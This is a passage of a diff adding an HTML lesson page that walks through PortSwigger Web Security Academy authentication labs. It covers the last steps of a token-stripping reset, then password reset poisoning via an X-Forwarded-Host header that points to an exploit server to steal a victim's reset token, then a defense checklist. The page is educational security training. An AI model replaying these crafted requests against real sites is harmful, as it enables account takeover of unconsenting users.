+                    <strong>Inspect Reset Submission:</strong> Enter a new password (e.g., <code>newpassword123</code>). Intercept the submission in Burp Suite:
+                    <pre><code>POST /forgot-password?temp-forgot-password-token=xxxxxxxxxxxxxxxxxxxx HTTP/1.1
+Host: &lt;target-lab-id&gt;.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+temp-forgot-password-token=xxxxxxxxxxxxxxxxxxxx&amp;username=wiener&amp;new-password-1=newpassword123&amp;new-password-2=newpassword123</code></pre>
+                  </li>
+                  <li>
+                    <strong>Parameter Tampering &amp; Token Stripping:</strong> Send the request to Burp Repeater. Delete the token value from both the query parameter and the POST body:
+                    <pre><code>POST /forgot-password?temp-forgot-password-token= HTTP/1.1
+...
+temp-forgot-password-token=&amp;username=carlos&amp;new-password-1=hacked123&amp;new-password-2=hacked123</code></pre>
+                  </li>
+                  <li>
+                    <strong>Execute Account Takeover:</strong> Click <strong>Send</strong>. The backend simply verifies whether the submitted token (empty string) equals the database token for Carlos (null / uninitialized), or ignores the token check altogether, resetting Carlos's password to <code>hacked123</code>.
+                  </li>
+                  <li>Log in as <code>carlos:hacked123</code> to achieve full account takeover.</li>
+                </ol>
+
+                <!-- Section 8 -->
+                <h2 id="host-header-middleware-mechanics">8. Host Header Injection &amp; Reverse Proxy Middleware</h2>
+                <p>
+                  Web applications running behind reverse proxies, load balancers, and CDNs often construct absolute URLs dynamically based on incoming HTTP request headers:
+                </p>
+                <pre><code>$resetUrl = "https://" . $_SERVER['HTTP_HOST'] . "/forgot-password?token=" . $token;
+mail($userEmail, "Reset Your Password", $resetUrl);</code></pre>
+
+                <p>
+                  When intermediate reverse proxies handle requests, they often forward the client's original host header via <code>X-Forwarded-Host</code>. If the application trusts this header without validation, an attacker can poison the domain component of password reset links:
+                </p>
+
+                <!-- Section 9: Lab 5 -->
+                <h2 id="lab5-password-reset-poisoning">9. Lab 5: Password Reset Poisoning via Middleware</h2>
+
+                <div class="lab-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <span class="badge badge-practitioner">Practitioner Lab</span>
+                    <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware" target="_blank" rel="noopener noreferrer" class="small text-decoration-none fw-bold">
+                      View Official Lab <i class="bi bi-box-arrow-up-right"></i>
+                    </a>
+                  </div>
+                  <h4 class="fw-bold text-primary mb-2">Lab: Password reset poisoning via middleware</h4>
+                  <p class="small text-muted mb-0">
+                    <strong>Vulnerability:</strong> Intermediate reverse proxy middleware respects the <code>X-Forwarded-Host</code> header, allowing attackers to overwrite the domain in password reset emails sent to victims.
+                  </p>
+                </div>
+
+                <h3>Attack Methodology: Weaponizing the Host Header</h3>
+                <ol>
+                  <li>
+                    <strong>Capture Password Reset Request:</strong> On the login page, click <em>Forgot your password?</em>. Intercept the <code>POST /forgot-password</code> request in Burp Suite and send it to Burp Repeater.
+                  </li>
+                  <li>
+                    <strong>Configure Attacker Exploit Server:</strong> Open the provided Exploit Server tab and record your unique host identifier:
+                    <pre><code>YOUR-EXPLOIT-SERVER-ID.exploit-server.net</code></pre>
+                  </li>
+                  <li>
+                    <strong>Inject X-Forwarded-Host Header:</strong> In Burp Repeater, add the <code>X-Forwarded-Host</code> header pointing to your exploit server, and set the target username to <code>carlos</code>:
+                    <div class="terminal-window">
+                      <div class="terminal-header">
+                        <span class="terminal-circle tc-red"></span>
+                        <span class="terminal-circle tc-yellow"></span>
+                        <span class="terminal-circle tc-green"></span>
+                        <span class="terminal-title">Burp Repeater: Poisoned Password Reset Request</span>
+                      </div>
+                      <div class="terminal-body">
+                        POST /forgot-password HTTP/1.1<br>
+                        Host: &lt;lab-target-id&gt;.web-security-academy.net<br>
+                        <span style="color: #ff5f56; font-weight: bold;">X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span><br>
+                        Content-Type: application/x-www-form-urlencoded<br>
+                        Content-Length: 26<br><br>
+                        csrf=xxxxxx&amp;username=carlos
+                      </div>
+                    </div>
+                  </li>
+                  <li>
+                    <strong>Victim Interaction:</strong> The backend generates a valid cryptographic token for Carlos, builds the reset link using the poisoned host header:
+                    <pre><code>https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/forgot-password?temp-forgot-password-token=STOLEN_TOKEN_HERE</code></pre>
+                    and sends this link to Carlos's email address. The simulated victim clicks the link in their email.
+                  </li>
+                  <li>
+                    <strong>Harvesting Token from Access Logs:</strong> Navigate to your Exploit Server &gt; open the <strong>Access log</strong>. Observe an incoming HTTP GET request from Carlos's browser:
+                    <pre><code>10.0.x.x - - "GET /forgot-password?temp-forgot-password-token=mF4e3pQ7wK9xL2... HTTP/1.1" 404</code></pre>
+                  </li>
+                  <li>
+                    <strong>Account Takeover:</strong> Copy the stolen token. In your browser, navigate to the legitimate password reset endpoint on the target lab domain, replacing the token with Carlos's stolen token:
+                    <pre><code>https://&lt;lab-target-id&gt;.web-security-academy.net/forgot-password?temp-forgot-password-token=mF4e3pQ7wK9xL2...</code></pre>
+                    Submit a new password and immediately log in to Carlos's account, solving the lab.
+                  </li>
+                </ol>
+
+                <!-- Section 10 -->
+                <h2 id="enterprise-defense">10. Defense-in-Depth &amp; Remediation Architecture</h2>
+                <p>
+                  Securing authentication requires defensive controls at every layer of the application lifecycle:
+                </p>
+
+                <div class="card mb-3 border-success">
+                  <div class="card-header bg-success text-white fw-bold">
+                    <i class="bi bi-shield-check"></i> Defensive Hardening Checklist
+                  </div>
+                  <div class="card-body">
+                    <ul class="mb-0 small" style="line-height: 1.8;">
+                      <li><strong>Uniform Error Messages:</strong> Never indicate whether a username or password was incorrect. Always return: <em>"Invalid username or password"</em> with identical byte lengths and response times.</li>
+                      <li><strong>Strict Parameter Type Validation:</strong> Reject unexpected parameter types (e.g., rejecting arrays when strings are expected) to neutralize batch array bypass attacks.</li>
+                      <li><strong>Cryptographic 2FA Binding:</strong> Store the 2FA state server-side in the session cache (e.g., Redis) and block access to all authenticated routes until the 2FA state transition is marked complete.</li>
+                      <li><strong>Never Trust Host Headers for URLs:</strong> Hardcode domain names in server configuration files (e.g., <code>APP_URL=https://company.com</code>) rather than constructing reset links dynamically from <code>Host</code> or <code>X-Forwarded-Host</code> headers.</li>
+                      <li><strong>Single-Use, Time-Bound Tokens:</strong> Ensure password reset tokens are tied cryptographically to a user ID, expire within 15 minutes, and invalidate immediately upon use.</li>
+                    </ul>
+                  </div>
+                </div>
+
+                <!-- Section 11 -->
+                <h2 id="day8-takeaways">11. Day 8 Summary &amp; Key Takeaways</h2>
+                <div class="callout-box security-notice">
+                  <h4 class="text-primary"><i class="bi bi-check2-all"></i> Core Insights from Day 8</h4>
+                  <ul class="mb-0" style="line-height: 1.8;">
+                    <li><strong>Error Differences Fuel Enumeration:</strong> Subtly distinct error messages or response lengths transform a complex password brute-force into a trivial two-step reconnaissance task.</li>
+                    <li><strong>Rate Limits Can Be Circumvented via Protocol Features:</strong> Array structures in JSON bodies allow testing hundreds of passwords within a single HTTP request packet, completely bypassing IP rate limits.</li>
+                    <li><strong>2FA is Only as Strong as Its State Machine:</strong> If protected endpoints (like <code>/my-account</code>) fail to verify that the 2FA stage was completed, forced browsing neutralizes 2FA entirely.</li>
+                    <li><strong>Host Header Poisoning is Lethal:</strong> Dynamically building password reset links from reverse proxy headers allows unauthenticated attackers to steal reset tokens out-of-band.</li>
+                  </ul>
+                </div>
+
+                <!-- Ethical Use & Legal Warning Notice -->
+                <div
+                  class="p-3 my-4 rounded border border-danger bg-danger bg-opacity-10 d-flex align-items-start gap-3">
+                  <div class="text-danger fs-2" style="line-height: 1;">
+                    <i class="bi bi-exclamation-triangle-fill"></i>
+                  </div>
+                  <div>
+                    <h5 class="fw-bold text-danger mb-1" style="font-size: 16px;">
+                      WARNING: Strictly For Educational &amp; Defensive Purposes Only
+                    </h5>
+                    <p class="mb-0 text-dark small" style="line-height: 1.6;">
+                      All authentication attacks, brute-force bypasses, and Host header poisoning techniques documented in this report were executed strictly inside authorized PortSwigger Web Security Academy lab environments. Attempting unauthorized access, password resets, or brute-force attacks against third-party web services without explicit written permission is illegal under the Electronic Transactions Act (ETA) of Nepal and international cyber law. TheWH2 and BugXploit promote ethical, responsible offensive security research.
+                    </p>
+                  </div>
+                </div>
+
+              </div><!-- .article-content -->
+
+              <!-- Bottom Navigation -->
+              <div class="lesson-nav-buttons">
+                <a href="../day7/index.html" class="btn btn-outline-secondary">
+                  <i class="bi bi-arrow-left"></i> Previous: Day 7
+                </a>
+                <a href="../index.html" class="btn btn-primary">
+                  <i class="bi bi-grid-fill"></i> Workshop Overview
+                </a>
+              </div>
+
+            </article>
+
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Lesson Detailed Content -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="copyright">
+        &copy; 2026 <strong><span>TheWH2</span></strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+        Designed with Security by <a href="../../../index.html">TheWH2</a>
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="../../../assets/vendor/aos/aos.js"></script>
+  <script src="../../../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="../../../assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="../../../assets/vendor/swiper/swiper-bundle.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="../../../assets/js/main.js"></script>
+
+  <!-- Automatic Clipboard Copy Button for all code blocks -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const codeBlocks = document.querySelectorAll('.lesson-article pre');
+
+      codeBlocks.forEach(function (pre) {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'code-block-wrapper';
+        pre.parentNode.insertBefore(wrapper, pre);
+        wrapper.appendChild(pre);
+
+        const copyBtn = document.createElement('button');
+        copyBtn.className = 'code-copy-btn';
+        copyBtn.setAttribute('type', 'button');
+        copyBtn.setAttribute('title', 'Copy code to clipboard');
+        copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+
+        copyBtn.addEventListener('click', function () {
+          const codeText = pre.innerText.trim();
+          navigator.clipboard.writeText(codeText).then(function () {
+            copyBtn.classList.add('copied');
+            copyBtn.innerHTML = '<i class="bi bi-check-lg"></i>';
+            setTimeout(function () {
+              copyBtn.classList.remove('copied');
+              copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+            }, 2000);
+          }).catch(function (err) {
+            console.error('Failed to copy: ', err);
+          });
+        });
+
+        wrapper.appendChild(copyBtn);
+      });
+    });
+  </script>
+
+</body>
+
+</html>
